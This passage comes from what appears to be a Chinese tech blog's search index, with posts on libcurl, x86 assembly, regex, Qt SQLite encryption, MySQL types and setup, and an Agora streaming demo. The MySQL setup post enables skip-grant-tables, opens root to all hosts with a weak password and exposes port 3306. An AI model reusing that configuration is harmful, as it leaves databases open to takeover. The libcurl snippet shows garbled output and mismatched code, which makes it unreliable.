MACHINE=x86 执行以后就能在根目录 build 下看到生成了对应的文件夹，这时候就可以在项目中使用了。注意生成目录下有 bin、include、lib 三个文件夹。 1.2 使用将生成的文件拖动到项目所在文件夹目录下，这时候需要做以下几个步骤，打开项目的属性页面： 1.2.1 预处理器在预处理器中添加以下字段： 1;BUILDING_LIBCURL;HTTP_ONLY; 1.2.2 附加库 在链接器中附加库目录，把lib文件夹添加到附加库目录当中 添加lib文件 1libcurl_a.lib;Ws2_32.lib;Wldap32.lib;winmm.lib;Crypt32.lib;Normaliz.lib;%(AdditionalDependencies) 1.3.3 使用12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;#include &quot;curl/curl.h&quot;string UriHelper::Encode(const string&amp; source)&#123; CURL* curl = curl_easy_init(); char* cres = curl_easy_escape(curl, source.c_str(), source.length()); string res(cres); curl_free(cres); curl_easy_cleanup(curl); return res;&#125;int main()&#123; std::cout &lt;&lt; &quot;Hello World!\\n&quot;; std::cout &lt;&lt; Encode(R&quot;(https://10.92.4.117:8443/tac /download/client/com.qianxin.trustagent.win.standard.exe.bm-3.1.1.4585/ TrustAgent_standard_3.1.1.4585.aef031d09[10.92.4.117@443].exe)&quot;) &lt;&lt; std::endl;&#125; 输出：http0.0000000.0000000.000000www.baidu.com0.000000s0.000000ie%3Dutf-8 0.000000%3D8 %3Dbaidu%26wd%3D5.185438E-3164%B8%B48.694087E-3156%97%B65.190920E-3169%820.000000E5.12199E-31670.000000E%B1","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"HTTP","slug":"HTTP","permalink":"http://example.com/tags/HTTP/"},{"name":"Curl","slug":"Curl","permalink":"http://example.com/tags/Curl/"},{"name":"网络编程","slug":"网络编程","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"网络编程","slug":"B-Code/网络编程","permalink":"http://example.com/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"【汇编】无参无返回函数调用","date":"2023-10-27T01:24:02.363Z","path":"B_Code/汇编/无参无返回函数调用/","text":"概述：无参无返回函数的调用汇编及堆栈说明 代码汇编12345678910111213141516171819202122232425void Fun()&#123;00411780 push ebp 00411781 mov ebp,esp 00411783 sub esp,0C0h 00411789 push ebx 0041178A push esi 0041178B push edi 0041178C mov edi,ebp 0041178E xor ecx,ecx 00411790 mov eax,0CCCCCCCCh 00411795 rep stos dword ptr es:[edi] 00411797 mov ecx,offset _460A191B_SimpleFun@cpp (041C067h) 0041179C call @__CheckForDebuggerJustMyCode@4 (0411325h) &#125;004117A1 pop edi 004117A2 pop esi 004117A3 pop ebx 004117A4 add esp,0C0h 004117AA cmp ebp,esp 004117AC call __RTC_CheckEsp (0411249h) 004117B1 mov esp,ebp 004117B3 pop ebp 004117B4 ret 堆栈","tags":[{"name":"汇编","slug":"汇编","permalink":"http://example.com/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"汇编","slug":"B-Code/汇编","permalink":"http://example.com/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"正则表达式反向引用","date":"2023-10-27T01:24:02.359Z","path":"B_Code/正则表达式/匹配不等于/","text":"[^a]* 表示匹配除了a以外的所有字符[^abc]* 表示匹配除了a、b、c以外的所有字符，注意这里不是abc字符串，而是a、b、c任何一个字符都不匹配 当我们要不匹配某个字符串或者中文词组的时候，可以这样用((?!天空).)* 这个表示匹配出’天空’之外的所有字符 regex(?![0-9]+) 匹配不是regex，但后面不是数字","tags":[{"name":"regex","slug":"regex","permalink":"http://example.com/tags/regex/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"正则表达式","slug":"B-Code/正则表达式","permalink":"http://example.com/categories/B-Code/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"Qt插件——使用 QtCipherSqlitePlugin 对数据库进行加密","date":"2023-10-27T01:24:02.358Z","path":"B_Code/数据库/数据库加密/","text":"开源库介绍devbean&#x2F;QtCipherSqlitePlugin: A Qt plugin for cipher SQLite. (github.com) 该加密库是基于 SQLite 和 wxSQLite3 源代码开发的的一个加密 SQLite 的Qt插件。总结就是，可以使用该插件对 SQLite 的数据库进行加密。 开始 在开始之前，可以去仓库的 wiki 界面找到相应的开始教程，以下操作参考 wiki 。 拉取该库到本地后，打开 QtCipherSqlitePlugin.pro，就能看到如下图所示的工程结构。 demo 目录是一个如何使用该加密插件的工程，涉及数据库的加密、打开、创建等 sqlitecipher是我们编译 dll 的工程文件 为 Qt 的插件测试工程，里边有关于该加密库的详细使用方式介绍。 不论是使用上述测试工程中的哪个，我们第一步都需要编译插件的动态库出来使用。 单独sqlitecipher.pro 为 sqlitecipher.pro 调整 Qt kits ，笔者的环境为 MSVC 2015 32 bit, Release模式 右击项目文件，点击部署即可 到工程所在的文件夹，就能看到 build-sqlitecipher-Desktop_Qt_5_9_9_MSVC2015_32bit-Release 的文件夹，在 .\\plugins\\sqldrivers下就能看到生成的动态库文件，动态库 sqlitecipher.dll 拷贝该文件到你的 Qt 目录下 kits 对应的文件夹当中。如笔者的为 $Qt安装目录$\\5.9.9\\msvc2015\\plugins\\sqldrivers 使用到这一步，我们就需要查看一下动态库是否可用了。使用 Qt 的 #include &lt;QSqlDatabase&gt;中的方法即可： 1qDebug() &lt;&lt; QSqlDatabase::drivers(); 执行上述代码，如果加载成功的话，我们会在 qDebug() 的输出中看到相应的数据库名。 (&quot;QSQLITE&quot;, &quot;QMYSQL&quot;, &quot;QMYSQL3&quot;, &quot;QODBC&quot;, &quot;QODBC3&quot;, &quot;QPSQL&quot;, &quot;QPSQL7&quot;, &quot;SQLITECIPHER&quot;) 以上代码，在 demo 所在工程中都能找到对应的代码，不用读者编写。 另外，使用 SQLITECIPHER 数据库也可以打开普通未加密的 QSQLITE 创建的数据库。 加密加密数据库的使用也简单，区别于普通数据库的方式是需要设置连接属性。以该开源库为例，其主要通过三个连接属性去决定是否设置密码。主要涉及到的关键字为以下三个： Added by QtCipherSqlitePlugin QSQLITE_CREATE_KEY QSQLITE_UPDATE_KEY QSQLITE_REMOVE_KEY 还有其他几个继承自 SqlitePlugin 的关键字，用法与 SqlitePlugin 打开数据库设置一致。 Provided by Qt SqlitePlugin QSQLITE_BUSY_TIMEOUT QSQLITE_OPEN_READONLY QSQLITE_OPEN_URI QSQLITE_ENABLE_SHARED_CACHE 以下代码演示三种关键字的用法。 创建数据库密码 QSQLITE_CREATE_KEY如果输出中有 SQLITECIPHER 的名字，那么恭喜你，插件没有问题！为没有加密的数据库增加密码Qt 默认提供的 SQLite 插件是没有加密功能的。新版本的 QtCipherSqlitePlugin 支持为原本没有加密的数据库增加密码，使用方法如下：C++ 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_CREATE_KEY&quot;); if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; 上面的代码，我们使用 test.db 数据库，将密码设置为 test，同时指定连接选项为 QSQLITE_CREATE_KEY 。此时，调用 open() 函数之后，QtCipherSqlitePlugin 将使用改密码为这个数据库进行加密。 删除数据库密码 QSQLITE_REMOVE_KEYQtCipherSqlitePlugin 可以删除数据库密码，此时需要提供原密码，并使用连接选项 QSQLITE_REMOVE_KEY ，如下： 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_REMOVE_KEY&quot;);if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; 更新数据库密码 QSQLITE_UPDATE_KEYQtCipherSqlitePlugin 可以更新数据库原有密码，需要设置原密码，并且使用连接选项 QSQLITE_UPDATE_KEY 设置新密码，具体代码如下： 12345678QSqlDatabase dbconn = QSqlDatabase::addDatabase(&quot;SQLITECIPHER&quot;);dbconn.setDatabaseName(&quot;test.db&quot;);dbconn.setPassword(&quot;test&quot;);dbconn.setConnectOptions(&quot;QSQLITE_UPDATE_KEY=newtest&quot;); if (!dbconn.open()) &#123; qDebug() &lt;&lt; &quot;Can not open connection: &quot; &lt;&lt; dbconn.lastError().driverText(); exit(CONNECTION_FAILED);&#125; 如果原密码不正确，QtCipherSqlitePlugin 会直接返回错误。 如果新密码设置为空，例如 QSQLITE_UPDATE_KEY= ，则作用等同于删除密码。同样的，设置 setConnectOptions(&quot;&quot;) 也相当于清除设置的属性。 补充以下代码是我个人想写一个通用的设置属性的接口，后来思考一番不太现实以示众多读者，不要重蹈覆辙。 1234567891011121314151617bool setDBConfig(QSqlDatabase* dbconn, QMap&lt;ENUM_SQLKEY, QString&gt; qMapCfg)&#123; for (auto it : qMapCfg.toStdMap()) &#123; if (it.first &lt;= QSQLITE_REMOVE_KEY) &#123; dbconn-&gt;setPassword(it.second); dbconn-&gt;setConnectOptions(GETOBJNAME(it.first)); &#125; else if (it.first == QSQLITE_UPDATE_KEY) &#123; dbconn-&gt;setPassword(it.second); dbconn-&gt;setConnectOptions(QString(&quot;%1=%2&quot;).arg().arg()); &#125; &#125;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"加密","slug":"加密","permalink":"http://example.com/tags/%E5%8A%A0%E5%AF%86/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"数据库","slug":"B-Code/数据库","permalink":"http://example.com/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"【MYSQL】数据类型","date":"2023-10-27T01:24:02.354Z","path":"B_Code/数据库/MYSQL/数据类型/","text":"MYSQL 数据类型整理MySQL 中定义数据字段的类型对你数据库的优化是非常重要的。 MySQL 支持多种类型，大致可以分为三类：数值、日期&#x2F;时间和字符串(字符)类型。 数值类型MySQL 支持所有标准 SQL 数值数据类型。 这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL 和 NUMERIC)，以及近似数值数据类型(FLOAT、REAL 和 DOUBLE PRECISION)。 关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。 BIT数据类型保存位字段值，并且支持 MyISAM、MEMORY、InnoDB 和 BDB表。 作为 SQL 标准的扩展，MySQL 也支持整数类型 TINYINT、MEDIUMINT 和 BIGINT。下面的表显示了需要的每个整数类型的存储和范围。 类型 大小 范围（有符号） 范围（无符号） 用途 TINYINT 1 Bytes (-128，127) (0，255) 小整数值 SMALLINT 2 Bytes (-32 768，32 767) (0，65 535) 大整数值 MEDIUMINT 3 Bytes (-8 388 608，8 388 607) (0，16 777 215) 大整数值 INT或INTEGER 4 Bytes (-2 147 483 648，2 147 483 647) (0，4 294 967 295) 大整数值 BIGINT 8 Bytes (-9,223,372,036,854,775,808，9 223 372 036 854 775 807) (0，18 446 744 073 709 551 615) 极大整数值 FLOAT 4 Bytes (-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38) 0，(1.175 494 351 E-38，3.402 823 466 E+38) 单精度 浮点数值 DOUBLE 8 Bytes (-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308) 0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308) 双精度 浮点数值 DECIMAL 对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2 依赖于M和D的值 依赖于M和D的值 小数值 日期和时间类型表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。 每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。 TIMESTAMP类型有专有的自动更新特性，将在后面描述。 类型 大小 ( bytes) 范围 格式 用途 DATE 3 1000-01-01&#x2F;9999-12-31 YYYY-MM-DD 日期值 TIME 3 ‘-838:59:59’&#x2F;‘838:59:59’ HH:MM:SS 时间值或持续时间 YEAR 1 1901&#x2F;2155 YYYY 年份值 DATETIME 8 ‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’ YYYY-MM-DD hh:mm:ss 混合日期和时间值 TIMESTAMP 4 ‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038年1月19日 凌晨 03:14:07 YYYY-MM-DD hh:mm:ss 混合日期和时间值，时间戳 字符串类型字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。 类型 大小 用途 CHAR 0-255 bytes 定长字符串 VARCHAR 0-65535 bytes 变长字符串 TINYBLOB 0-255 bytes 不超过 255 个字符的二进制字符串 TINYTEXT 0-255 bytes 短文本字符串 BLOB 0-65 535 bytes 二进制形式的长文本数据 TEXT 0-65 535 bytes 长文本数据 MEDIUMBLOB 0-16 777 215 bytes 二进制形式的中等长度文本数据 MEDIUMTEXT 0-16 777 215 bytes 中等长度文本数据 LONGBLOB 0-4 294 967 295 bytes 二进制形式的极大文本数据 LONGTEXT 0-4 294 967 295 bytes 极大文本数据 注意：char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。 CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。 BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。 BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。 有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"数据库","slug":"B-Code/数据库","permalink":"http://example.com/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"MYSQL","slug":"B-Code/数据库/MYSQL","permalink":"http://example.com/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/MYSQL/"}]},{"title":"【MYSQL】Ubuntu22.04安装 MYSQL 并使用 navicat 连接","date":"2023-10-27T01:24:02.350Z","path":"B_Code/数据库/MYSQL/README/","text":"[toc] 安装Ubuntu 安装 mysql 的教程网上一大堆。 1sudo apt-get install mysql-server 配置 修改配置文件 1sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf 在 [mysqld] 添加 skip-grant-tables 重启数据库 12345sudo systemctl restart mysql# 或者sudo service mysql restart 修改用户属性 进入 mysql 1234sudo mysql -u root# 切换到 mysql 数据库use mysql; 更新用户密码 12345alter user root identified with mysql_native_password by &#x27;Admin1234&#x27;;# 或者update user set authentication_string=&#x27;Admin1234&#x27; where user=&#x27;admin&#x27;; 到此就可以使用用户登录了。 1mysql -u root -p 补充，创建其他用户 1CREATE USER &#x27;username&#x27;@&#x27;host&#x27; IDENTIFIED BY &#x27;password&#x27;; 授权远程使用 更改授权后，一定要执行 flush priviledges;。 1grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27;; 执行上一步可能会报错，因为在 上一步 修改用户密码时，设置了地址为 localhost。所以这里不能直接授权其他主机访问，需要先把root账号的host修改为可以访问所有主机，再去授权。 修改root账户 123update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;;flush priviledges; 授权远程使用 123grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27;;flush priviledges; 重启数据库 12345sudo systemctl restart mysql# 或者sudo service mysql restart 使用 navicat 连接数据库 如果出现连接时报错 1130-host ... is not allowed to connect to this MySql server。则说明是服务器端口权限没开放。简单改动可直接使用ufw命令。如下所示： sudo ufw allow 3306 如下图所示： 连接名：随便起名，用来区分连接的数据库 主机：192.168.0.102 为虚拟机的ip地址 端口：3306,mysql默认端口 用户名：root 密码：密码","tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"http://example.com/tags/ubuntu/"},{"name":"navicat","slug":"navicat","permalink":"http://example.com/tags/navicat/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"数据库","slug":"B-Code/数据库","permalink":"http://example.com/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"MYSQL","slug":"B-Code/数据库/MYSQL","permalink":"http://example.com/categories/B-Code/%E6%95%B0%E6%8D%AE%E5%BA%93/MYSQL/"}]},{"title":"音频房间创建及连接说明","date":"2023-10-27T01:24:02.345Z","path":"B_Code/TypeScript/音频传输/","text":"声网开源通话代码API-Examples-Web&#x2F;Demo&#x2F;selfRendering at main · AgoraIO&#x2F;API-Examples-Web UI CSS1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.banner &#123; padding: 0; background-color: #52575c; color: white;&#125;.banner-text &#123; padding: 8px 20px; margin: 0;&#125;#join-form &#123; margin-top: 10px;&#125;.tips &#123; font-size: 12px; margin-bottom: 2px; color: gray;&#125;.join-info-text &#123; margin-bottom: 2px;&#125;input &#123; width: 100%; margin-bottom: 2px;&#125;.player &#123; width: 480px; height: 320px;&#125;.player-name &#123; margin: 8px 0;&#125;#success-alert, #success-alert-with-token &#123; display: none;&#125;@media (max-width: 640px) &#123; .player &#123; width: 320px; height: 240px; &#125;&#125; HTML12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Video Self-Rendering -- Agora&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../assets/bootstrap.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container-fluid banner&quot;&gt; &lt;p class=&quot;banner-text&quot;&gt;Video Self-Rendering&lt;/p&gt; &lt;a style=&quot;color: rgb(255, 255, 255);fill: rgb(255, 255, 255);fill-rule: evenodd; position: absolute; right: 10px; top: 4px;&quot; class=&quot;Header-link &quot; href=&quot;https://github.com/AgoraIO/API-Examples-Web/tree/main/Demo&quot;&gt; &lt;svg class=&quot;octicon octicon-mark-github v-align-middle&quot; height=&quot;32&quot; viewBox=&quot;0 0 16 16&quot; version=&quot;1.1&quot; width=&quot;32&quot; aria-hidden=&quot;true&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z&quot;&gt;&lt;/path&gt;&lt;/svg&gt; &lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;success-alert&quot; class=&quot;alert alert-success alert-dismissible fade show&quot; role=&quot;alert&quot;&gt; &lt;strong&gt;Congratulations!&lt;/strong&gt;&lt;span&gt; You can invite others to watch your live by click &lt;/span&gt;&lt;a href=&quot;&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt; &lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt; &lt;/button&gt; &lt;/div&gt; &lt;div class=&quot;container&quot;&gt; &lt;form id=&quot;join-form&quot; name=&quot;join-form&quot;&gt; &lt;div class=&quot;row join-info-group&quot;&gt; &lt;div class=&quot;col-sm&quot;&gt; &lt;p class=&quot;join-info-text&quot;&gt;AppID&lt;/p&gt; &lt;input id=&quot;appid&quot; type=&quot;text&quot; placeholder=&quot;enter appid&quot; required&gt; &lt;p class=&quot;tips&quot;&gt;If you don`t know what is your appid, checkout &lt;a href=&quot;https://docs.agora.io/en/Agora%20Platform/terms?platform=All%20Platforms#a-nameappidaapp-id&quot;&gt;this&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;col-sm&quot;&gt; &lt;p class=&quot;join-info-text&quot;&gt;Token(optional)&lt;/p&gt; &lt;input id=&quot;token&quot; type=&quot;text&quot; placeholder=&quot;enter token&quot;&gt; &lt;p class=&quot;tips&quot;&gt;If you don`t know what is your token, checkout &lt;a href=&quot;https://docs.agora.io/en/Agora%20Platform/terms?platform=All%20Platforms#a-namekeyadynamic-key&quot;&gt;this&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;col-sm&quot;&gt; &lt;p class=&quot;join-info-text&quot;&gt;Channel&lt;/p&gt; &lt;input id=&quot;channel&quot; type=&quot;text&quot; placeholder=&quot;enter channel name&quot; required&gt; &lt;p class=&quot;tips&quot;&gt;If you don`t know what is your channel, checkout &lt;a href=&quot;https://docs.agora.io/en/Agora%20Platform/terms?platform=All%20Platforms#channel&quot;&gt;this&lt;/a&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;col-sm&quot;&gt; &lt;p class=&quot;join-info-text&quot;&gt;User ID(optional)&lt;/p&gt; &lt;input id=&quot;uid&quot; type=&quot;text&quot; onkeyup=&quot;this.value=this.value.replace(/[^0-9]/g,&#x27;&#x27;)&quot; onafterpaste=&quot;this.value=this.value.replace(/[^0-9]/g,&#x27;&#x27;)&quot; placeholder=&quot;Enter the user ID&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;button-group&quot;&gt; &lt;button id=&quot;host-join&quot; type=&quot;submit&quot; class=&quot;btn btn-primary btn-sm&quot;&gt;Join as host&lt;/button&gt; &lt;div class=&quot;btn-group&quot;&gt; &lt;button id=&quot;audience-join&quot; type=&quot;button&quot; class=&quot;btn btn-primary btn-sm&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; Join as audience &lt;/button&gt; &lt;div class=&quot;audience dropdown-menu&quot;&gt; &lt;a id=&quot;lowLatency&quot; class=&quot;dropdown-item&quot; label=&quot;Interactive Live Streaming Standard&quot; href=&quot;#&quot;&gt;Interactive Live Streaming Standard&lt;/a&gt; &lt;a id=&quot;ultraLowLatency&quot; class=&quot;dropdown-item&quot; label=&quot;Interactive Live Streaming Premium&quot; href=&quot;#&quot;&gt;Interactive Live Streaming Premium&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;button id=&quot;leave&quot; type=&quot;button&quot; class=&quot;btn btn-primary btn-sm&quot; disabled&gt;Leave&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;!-- Single button --&gt; &lt;div class=&quot;row video-group&quot;&gt; &lt;div class=&quot;col&quot;&gt; &lt;p id=&quot;local-player-name&quot; class=&quot;player-name&quot;&gt;&lt;/p&gt; &lt;div id=&quot;local-player&quot; class=&quot;player&quot;&gt;&lt;/div&gt; &lt;div id=&quot;local-player-mirror-area&quot; class=&quot;player video-mirror&quot; title=&quot;Video Mirror&quot; style=&quot;display: none; border: 2px dashed red ;&quot;&gt; &lt;div id=&quot;local-player-mirror&quot; style=&quot;width: 100%; height: 100%; position: relative; overflow: hidden; background-color: black;&quot;&gt; &lt;video id=&quot;local-player-mirror-video-track&quot; class=&quot;agora_video_player&quot; playsinline=&quot;&quot; muted=&quot;&quot; style=&quot;width: 100%; height: 100%; position: absolute; left: 0px; top: 0px; transform: rotateY(180deg); object-fit: cover;&quot;&gt; &lt;/video&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;w-100&quot;&gt;&lt;/div&gt; &lt;div class=&quot;col&quot;&gt; &lt;div id=&quot;remote-playerlist&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;../assets/jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../assets/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://download.agora.io/sdk/release/AgoraRTC_N.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 通话逻辑123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199// create Agora clientvar client = AgoraRTC.createClient(&#123;mode: &quot;live&quot;, codec: &quot;vp8&quot;&#125;);AgoraRTC.enableLogUpload();var localTracks = &#123; videoTrack: null, audioTrack: null&#125;;var remoteUsers = &#123;&#125;;// Agora client optionsvar options = &#123; appid: null, channel: null, uid: null, token: null, role: &quot;audience&quot;, // host or audience audienceLatency: 2&#125;;// the demo can auto join channel with params in url$(() =&gt; &#123; var urlParams = new URL(location.href).searchParams; options.appid = urlParams.get(&quot;appid&quot;); options.channel = urlParams.get(&quot;channel&quot;); options.token = urlParams.get(&quot;token&quot;); options.uid = urlParams.get(&quot;uid&quot;); if (options.appid &amp;&amp; options.channel) &#123; $(&quot;#uid&quot;).val(options.uid); $(&quot;#appid&quot;).val(options.appid); $(&quot;#token&quot;).val(options.token); $(&quot;#channel&quot;).val(options.channel); $(&quot;#join-form&quot;).submit(); &#125;&#125;)$(&quot;#host-join&quot;).click(function (e) &#123; options.role = &quot;host&quot;&#125;)$(&quot;#lowLatency&quot;).click(function (e) &#123; options.role = &quot;audience&quot; options.audienceLatency = 1 $(&quot;#join-form&quot;).submit()&#125;)$(&quot;#ultraLowLatency&quot;).click(function (e) &#123; options.role = &quot;audience&quot; options.audienceLatency = 2 $(&quot;#join-form&quot;).submit()&#125;)$(&quot;#join-form&quot;).submit(async function (e) &#123; e.preventDefault(); $(&quot;#host-join&quot;).attr(&quot;disabled&quot;, true); $(&quot;#audience-join&quot;).attr(&quot;disabled&quot;, true); try &#123; options.appid = $(&quot;#appid&quot;).val(); options.token = $(&quot;#token&quot;).val(); options.channel = $(&quot;#channel&quot;).val(); options.uid = Number($(&quot;#uid&quot;).val()); await join(); if (options.role === &quot;host&quot;) &#123; $(&quot;#success-alert a&quot;).attr(&quot;href&quot;, `index.html?appid=$&#123;options.appid&#125;&amp;channel=$&#123;options.channel&#125;&amp;token=$&#123;options.token&#125;`); if (options.token) &#123; $(&quot;#success-alert-with-token&quot;).css(&quot;display&quot;, &quot;block&quot;); &#125; else &#123; $(&quot;#success-alert a&quot;).attr(&quot;href&quot;, `index.html?appid=$&#123;options.appid&#125;&amp;channel=$&#123;options.channel&#125;&amp;token=$&#123;options.token&#125;`); $(&quot;#success-alert&quot;).css(&quot;display&quot;, &quot;block&quot;); &#125; &#125; &#125; catch (error) &#123; console.error(error); &#125; finally &#123; $(&quot;#leave&quot;).attr(&quot;disabled&quot;, false); &#125;&#125;)$(&quot;#leave&quot;).click(function (e) &#123; leave();&#125;)async function join() &#123; // create Agora client if (options.role === &quot;audience&quot;) &#123; client.setClientRole(options.role, &#123;level: options.audienceLatency&#125;); // add event listener to play remote tracks when remote user publishs. client.on(&quot;user-published&quot;, handleUserPublished); client.on(&quot;user-unpublished&quot;, handleUserUnpublished); &#125; else&#123; client.setClientRole(options.role); &#125; // join the channel options.uid = await client.join(options.appid, options.channel, options.token || null, options.uid || null); if (options.role === &quot;host&quot;) &#123; // create local audio and video tracks localTracks.audioTrack = await AgoraRTC.createMicrophoneAudioTrack(); localTracks.videoTrack = await AgoraRTC.createCameraVideoTrack(); // play local video track localTracks.videoTrack.play(&quot;local-player&quot;); 